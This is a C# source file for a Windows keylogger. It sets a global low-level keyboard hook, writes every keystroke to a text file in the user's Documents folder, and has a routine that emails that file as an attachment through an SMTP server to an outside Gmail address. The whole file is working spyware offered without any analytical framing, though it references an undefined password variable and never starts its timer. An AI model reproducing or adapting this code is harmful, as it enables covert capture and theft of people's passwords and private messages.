using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;


namespace keyLoger
{
    public struct keyboardHookStruct
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public int dwExtraInfo;
    }

    public static class KeyLoger
    {

        private static void Callback(object state)
        {
            var tread = new Thread(SendMail);
            tread.Start();
        }

        private static string path = string.Format(@"C:\Users\{0}\Documents\KeyLogs.txt", Environment.UserName);
        #region Constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        //private const int WM_KEYUP = 0x101;
        //private const int WM_KEYPRESS = 0x102;
        //private const int WM_SYSKEYDOWN = 0x104;
        //private const int WM_SYSKEYUP = 0x105;
        //private const int WM_SYSKEYPRESS = 0x0106;

        private const byte VK_RETURN = 0X0D; //Enter
        private const byte VK_SHIFT = 0x10; //shift
        private const byte VK_CAPITAL = 0x14; //capslock
        #endregion

        private static KeyboardHookProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        
        public static void IntializeLL_KEYBOARDHook()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);   
        }

        private delegate int KeyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        private static IntPtr SetHook(KeyboardHookProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0/*threadId*/);
            }
        }

      private static int HookCallback(int code, int wParam, ref keyboardHookStruct lParam)
        {
            var isDownShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80);
            var isDownCapslock = (GetKeyState(VK_CAPITAL) != 0);
            if (code >= 0)
            {
                if (wParam == WM_KEYDOWN)
                {
                    var keyState = new byte[256];
                    GetKeyboardState(keyState);
                    var inBuffer = new byte[2];
                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyState, inBuffer, lParam.flags) != 1)
                        return CallNextHookEx(_hookID, code, wParam, ref lParam);

                    var key = (char)inBuffer[0];
                    
                    if (isDownCapslock || isDownShift)
                    {
                        key = char.IsLetter(key) ? char.ToUpper(key) : Encoding.Default.GetString(inBuffer)[0];
                    }
                    File.AppendAllText(path, inBuffer[0] == VK_RETURN ? Environment.NewLine : key.ToString());
                }
            }
            return CallNextHookEx(_hookID, code, wParam, ref lParam);
        }

      private static void SendMail()
      {
          const string email = "novak_andriy@mail.ru";
          var smtpClient = new SmtpClient("smtp.mail.ru", 587);//new SmtpClient("smtp.gmail.com", 587); //Gmail smtp

          var msg = new MailMessage(new MailAddress(email),/*from*/
              new MailAddress("kruzerandriy@gmail.com")/*to*/)
          {
              Subject = "keyLoger",
              Body = DateTime.Now.ToString(),
              IsBodyHtml = true
          };
          msg.Attachments.Add(new Attachment(path));
          smtpClient.EnableSsl = true;
          smtpClient.Credentials = new NetworkCredential(email, password);
          smtpClient.Send(msg);
      }

        #region DLL import
        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
       
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32")]
        private static extern int ToAscii(
            int uVirtKey,
            int uScanCode,
            byte[] lpbKeyState,
            byte[] lpwTransKey,
            int fuState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern short GetKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookProc callback, IntPtr hInstance, uint threadId);
        #endregion
    }
}
